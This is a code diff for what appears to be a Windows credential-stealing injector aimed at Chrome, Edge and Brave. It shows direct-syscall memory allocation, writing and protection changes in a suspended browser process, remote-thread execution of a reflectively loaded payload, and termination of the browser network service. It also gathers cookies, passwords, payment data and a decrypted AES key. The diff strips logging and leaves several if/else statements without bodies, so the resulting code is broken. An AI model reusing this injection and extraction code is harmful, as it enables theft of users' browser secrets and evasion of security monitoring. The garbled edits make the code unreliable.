@@ -121,32 +121,12 @@ public:
     void displayBanner() const
     {
         SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-        std::cout << "_________ .__                         ___________.__                       __                \n"
-                  << "\\_   ___ \\|  |_________  ____   _____ \\_   _____/|  |   _______  _______ _/  |_  ___________ \n"
-                  << "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\ |    __)_ |  | _/ __ \\  \\/ /\\__  \\\\   __\\/  _ \\_  __ \\\n"
-                  << "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\|        \\|  |_\\  ___/\\   /  / __ \\|  | (  <_> )  | \\/\n"
-                  << " \\______  /___|  /__|   \\____/|__|_|  /_______  /|____/\\___  >\\_/  (____  /__|  \\____/|__|   \n"
-                  << "        \\/     \\/                   \\/        \\/           \\/           \\/                   \n\n"
-                  << " Direct Syscall-Based Reflective Hollowing\n"
-                  << " x64 & ARM64 | " << APP_VERSION << " by @xaitax"
-                  << "\n\n";
         ResetColor();
     }
 
     void printUsage() const
     {
         SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-        std::wcout << L"Usage:\n"
-                   << L"  chrome_inject.exe [options] <chrome|brave|edge|all>\n\n"
-                   << L"Options:\n"
-                   << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
-                   << L"  --verbose|-v             Enable verbose debug output from the injector\n"
-                   << L"  --help|-h                Show this help message\n\n"
-                   << L"Browser targets:\n"
-                   << L"  chrome  - Extract from Google Chrome\n"
-                   << L"  brave   - Extract from Brave Browser\n"
-                   << L"  edge    - Extract from Microsoft Edge\n"
-                   << L"  all     - Extract from all installed browsers\n";
         ResetColor();
     }
 
@@ -225,12 +205,10 @@ public:
             std::wstring path = queryRegistryDefaultValue(regPath);
             if (!path.empty() && fs::exists(path))
             {
-                m_console.Debug("Found at: " + Utils::WStringToUtf8(path));
                 return path;
             }
         }
 
-        m_console.Debug("Not found in Registry");
         return L"";
     }
 
@@ -243,22 +221,17 @@ public:
             {L"edge", L"msedge.exe"},
             {L"brave", L"brave.exe"}};
 
-        m_console.Debug("Enumerating installed browsers...");
-
         for (const auto &[browserType, exeName] : supportedBrowsers)
         {
             std::wstring path = resolve(exeName);
             if (!path.empty())
             {
                 installedBrowsers.push_back({browserType, path});
-                m_console.Debug("Found " + Utils::Capitalize(Utils::WStringToUtf8(browserType)) + " at: " + Utils::WStringToUtf8(path));
             }
         }
 
         if (installedBrowsers.empty())
-            m_console.Warn("No supported browsers found installed on this system");
         else
-            m_console.Debug("Found " + std::to_string(installedBrowsers.size()) + " browser(s) to process");
 
         return installedBrowsers;
     }
@@ -283,7 +256,6 @@ private:
         if (!NT_SUCCESS(status))
         {
             if (status != (NTSTATUS)0xC0000034) // STATUS_OBJECT_NAME_NOT_FOUND
-                m_console.Debug("Registry access failed: " + Utils::NtStatusToString(status));
             return L"";
         }
 
@@ -400,8 +372,6 @@ struct Configuration
 
         if (config.browserDefaultExePath.empty())
         {
-            console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + " installation in Registry");
-            console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + " is properly installed");
             return std::nullopt;
         }
 
@@ -419,9 +389,6 @@ public:
 
     void createSuspended()
     {
-        m_console.Debug("Creating suspended " + m_config.browserDisplayName + " process.");
-        m_console.Debug("Target executable path: " + Utils::WStringToUtf8(m_config.browserDefaultExePath));
-
         STARTUPINFOW si{};
         PROCESS_INFORMATION pi{};
         si.cb = sizeof(si);
@@ -434,7 +401,6 @@ public:
         m_hThread.reset(pi.hThread);
         m_pid = pi.dwProcessId;
 
-        m_console.Debug("Created suspended process PID: " + std::to_string(m_pid));
         checkArchitecture();
     }
 
@@ -442,9 +408,7 @@ public:
     {
         if (m_hProcess)
         {
-            m_console.Debug("Terminating browser PID=" + std::to_string(m_pid) + " via direct syscall.");
             NtTerminateProcess_syscall(m_hProcess.get(), 0);
-            m_console.Debug(m_config.browserDisplayName + " terminated by injector.");
         }
     }
 
@@ -473,8 +437,6 @@ private:
             throw std::runtime_error("Architecture mismatch. Injector is " + std::string(getArchName(injectorArch)) +
                                      " but target is " + std::string(getArchName(m_arch)));
 
-        m_console.Debug("Architecture match: Injector=" + std::string(getArchName(injectorArch)) +
-                        ", Target=" + std::string(getArchName(m_arch)));
     }
 
     const char *getArchName(USHORT arch) const
@@ -521,17 +483,12 @@ public:
                                             1, 4096, 4096, 0, nullptr));
         if (!m_pipeHandle)
             throw std::runtime_error("CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));
-
-        m_console.Debug("Named pipe server created: " + Utils::WStringToUtf8(m_pipeName));
     }
 
     void waitForClient()
     {
-        m_console.Debug("Waiting for payload to connect to named pipe.");
         if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
             throw std::runtime_error("ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
-
-        m_console.Debug("Payload connected to named pipe.");
     }
 
     void sendInitialData(bool isVerbose, const fs::path &outputPath)
@@ -542,8 +499,6 @@ public:
 
     void relayMessages()
     {
-        m_console.Debug("Waiting for payload execution. (Pipe: " + Utils::WStringToUtf8(m_pipeName) + ")");
-
         if (m_console.m_verbose)
             std::cout << std::endl;
 
@@ -560,7 +515,6 @@ public:
             {
                 if (GetLastError() == ERROR_BROKEN_PIPE)
                     break;
-                m_console.Error("PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
                 break;
             }
 
@@ -589,7 +543,6 @@ public:
 
                 if (message == dllCompletionSignal)
                 {
-                    m_console.Debug("Payload completion signal received.");
                     completed = true;
                     break;
                 }
@@ -606,8 +559,6 @@ public:
 
         if (m_console.m_verbose)
             std::cout << std::endl;
-
-        m_console.Debug("Payload signaled completion or pipe interaction ended.");
     }
 
     const ExtractionStats &getStats() const { return m_stats; }
@@ -621,12 +572,10 @@ private:
             bytesWritten != (msg.length() + 1))
             throw std::runtime_error("WriteFile to pipe failed for message: " + msg);
 
-        m_console.Debug("Sent message to pipe: " + msg);
     }
 
     void parseExtractionMessage(const std::string &message)
     {
-        // Helper lambda to extract numeric value from pattern
         auto extractNumber = [&message](const std::string &prefix, const std::string &suffix) -> int
         {
             size_t start = message.find(prefix);
@@ -645,24 +594,6 @@ private:
                 return 0;
             }
         };
-
-        // Parse profile count
-        if (message.find("Found ") != std::string::npos && message.find("profile(s)") != std::string::npos)
-            m_stats.profileCount = extractNumber("Found ", " profile(s)");
-
-        // Parse AES key
-        if (message.find("Decrypted AES Key: ") != std::string::npos)
-            m_stats.aesKey = message.substr(message.find("Decrypted AES Key: ") + 19);
-
-        // Parse extraction counts
-        if (message.find(" cookies extracted to ") != std::string::npos)
-            m_stats.totalCookies += extractNumber("[*] ", " cookies");
-
-        if (message.find(" passwords extracted to ") != std::string::npos)
-            m_stats.totalPasswords += extractNumber("[*] ", " passwords");
-
-        if (message.find(" payments extracted to ") != std::string::npos)
-            m_stats.totalPayments += extractNumber("[*] ", " payments");
     }
 
     std::wstring m_pipeName;
@@ -678,16 +609,10 @@ public:
 
     void execute(const std::wstring &pipeName)
     {
-        m_console.Debug("Loading and decrypting payload DLL.");
         loadAndDecryptPayload();
-
-        m_console.Debug("Parsing payload PE headers for ReflectiveLoader.");
         DWORD rdiOffset = getReflectiveLoaderOffset();
         if (rdiOffset == 0)
             throw std::runtime_error("Could not find ReflectiveLoader export in payload.");
-        m_console.Debug("ReflectiveLoader found at file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));
-
-        m_console.Debug("Allocating memory for payload in target process.");
         PVOID remoteDllBase = nullptr;
         SIZE_T payloadDllSize = m_decryptedDllPayload.size();
         SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
@@ -697,23 +622,18 @@ public:
                                                           &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
-        m_console.Debug("Combined memory for payload and parameters allocated at: " + Utils::PtrToHexStr(remoteDllBase));
-
-        m_console.Debug("Writing payload DLL to target process.");
         SIZE_T bytesWritten = 0;
         status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase,
                                               m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtWriteVirtualMemory for payload DLL failed: " + Utils::NtStatusToString(status));
 
-        m_console.Debug("Writing pipe name parameter into the same allocation.");
         LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteDllBase) + payloadDllSize;
         status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr,
                                               (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
 
-        m_console.Debug("Changing payload memory protection to executable.");
         ULONG oldProtect = 0;
         status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase,
                                                 &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
@@ -721,7 +641,6 @@ public:
             throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));
 
         startHijackedThreadInTarget(remoteDllBase, rdiOffset, remotePipeNameAddr);
-        m_console.Debug("New thread created for payload. Main thread remains suspended.");
     }
 
 private:
@@ -796,8 +715,6 @@ private:
 
     void startHijackedThreadInTarget(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
     {
-        m_console.Debug("Creating new thread in target to execute ReflectiveLoader.");
-
         uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteDllBase) + rdiOffset;
         HANDLE hRemoteThread = nullptr;
 
@@ -808,8 +725,6 @@ private:
 
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtCreateThreadEx failed: " + Utils::NtStatusToString(status));
-
-        m_console.Debug("Successfully created new thread for payload.");
     }
 
     TargetProcess &m_target;
@@ -849,8 +764,6 @@ std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats &stat
 
 void KillBrowserNetworkService(const Configuration &config, const Console &console)
 {
-    console.Debug("Scanning for and terminating browser network services...");
-
     UniqueHandle hCurrentProc;
     HANDLE nextProcHandle = nullptr;
     int processes_terminated = 0;
@@ -886,7 +799,6 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
 
         if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService"))
         {
-            console.Debug("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
             NtTerminateProcess_syscall(hCurrentProc.get(), 0);
             processes_terminated++;
         }
@@ -894,7 +806,6 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
 
     if (processes_terminated > 0)
     {
-        console.Debug("Termination sweep complete. Waiting for file locks to fully release.");
         Sleep(1500);
     }
 }
@@ -927,17 +838,14 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
     if (singleBrowser)
     {
         if (!stats.aesKey.empty())
-            console.Success("AES Key: " + stats.aesKey);
 
         std::string summary = BuildExtractionSummary(stats);
         if (!summary.empty())
         {
             console.Success(summary);
-            console.Success("Stored in " + (outputPath / browserName).u8string());
         }
         else
         {
-            console.Warn("No data extracted");
         }
     }
     else
@@ -945,17 +853,14 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
         console.Info(browserName);
 
         if (!stats.aesKey.empty())
-            console.Success("AES Key: " + stats.aesKey);
 
         std::string summary = BuildExtractionSummary(stats);
         if (!summary.empty())
         {
             console.Success(summary);
-            console.Success("Stored in " + (outputPath / browserName).u8string());
         }
         else
         {
-            console.Warn("No data extracted");
         }
     }
 }
@@ -963,19 +868,16 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
 void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &outputPath)
 {
     if (verbose)
-        console.Info("Starting multi-browser extraction...");
 
     BrowserPathResolver resolver(console);
     auto installedBrowsers = resolver.findAllInstalledBrowsers();
 
     if (installedBrowsers.empty())
     {
-        console.Error("No supported browsers found on this system");
         return;
     }
 
     if (!verbose)
-        console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");
 
     int successCount = 0;
     int failCount = 0;
@@ -990,7 +892,6 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
         config.browserType = browserType;
         config.browserDefaultExePath = browserPath;
 
-        // Map browser type to process name
         static const std::map<std::wstring, std::pair<std::wstring, std::string>> browserMap = {
             {L"chrome", {L"chrome.exe", "Chrome"}},
             {L"edge", {L"msedge.exe", "Edge"}},
@@ -1005,8 +906,6 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
         if (verbose)
         {
-            console.Info("\n[Browser " + std::to_string(i + 1) + "/" + std::to_string(installedBrowsers.size()) +
-                         "] Processing " + config.browserDisplayName);
         }
 
         try
@@ -1016,7 +915,6 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
             if (verbose)
             {
-                console.Success(config.browserDisplayName + " extraction completed");
             }
             else
             {
@@ -1031,12 +929,10 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
             if (verbose)
             {
-                console.Error(config.browserDisplayName + " extraction failed: " + std::string(e.what()));
             }
             else
             {
                 console.Info(config.browserDisplayName);
-                console.Error("Extraction failed");
                 if (i < installedBrowsers.size() - 1)
                     std::cout << std::endl;
             }
@@ -1044,7 +940,6 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
     }
 
     std::cout << std::endl;
-    console.Info("Completed: " + std::to_string(successCount) + " successful, " + std::to_string(failCount) + " failed");
 }
 
 int wmain(int argc, wchar_t *argv[])
@@ -1053,7 +948,6 @@ int wmain(int argc, wchar_t *argv[])
     std::wstring browserTarget;
     fs::path outputPath;
 
-    // Parse arguments
     for (int i = 1; i < argc; ++i)
     {
         std::wstring_view arg = argv[i];
@@ -1082,7 +976,6 @@ int wmain(int argc, wchar_t *argv[])
 
     if (!InitializeSyscalls(isVerbose))
     {
-        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
         return 1;
     }
 
@@ -1093,7 +986,6 @@ int wmain(int argc, wchar_t *argv[])
     fs::create_directories(outputPath, ec);
     if (ec)
     {
-        console.Error("Failed to create output directory: " + outputPath.u8string() + ". Error: " + ec.message());
         return 1;
     }
 
@@ -1118,14 +1010,12 @@ int wmain(int argc, wchar_t *argv[])
         try
         {
             if (!isVerbose)
-                console.Info("Processing " + optConfig->browserDisplayName + "...\n");
 
             auto stats = RunInjectionWorkflow(*optConfig, console);
 
             if (!isVerbose)
                 DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, optConfig->outputPath);
             else
-                console.Success("\nExtraction completed successfully");
         }
         catch (const std::runtime_error &e)
         {
@@ -1134,6 +1024,5 @@ int wmain(int argc, wchar_t *argv[])
         }
     }
 
-    console.Debug("Injector finished successfully.");
     return 0;
 }
